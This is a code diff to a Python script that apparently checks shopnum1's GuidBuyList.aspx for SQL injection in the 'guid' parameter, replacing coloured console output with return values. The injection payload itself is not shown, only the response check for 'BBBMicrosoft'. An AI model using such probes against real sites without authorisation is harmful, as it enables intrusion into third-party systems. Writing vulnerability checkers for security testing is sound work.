@@ -8,8 +8,8 @@ description: 文件GuidBuyList.aspx中,参数guid存在SQL注入。
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class shopnum_GuidBuyList_sqli_BaseVerify:
     def __init__(self, url):
@@ -24,12 +24,12 @@ class shopnum_GuidBuyList_sqli_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"BBBMicrosoft" in req.text:
-                cprint("[+]存在shopnum1 GuidBuyList.aspx SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在shopnum1 GuidBuyList.aspx SQL注入漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = shopnum_GuidBuyList_sqli_BaseVerify(sys.argv[1])
     testVuln.run()
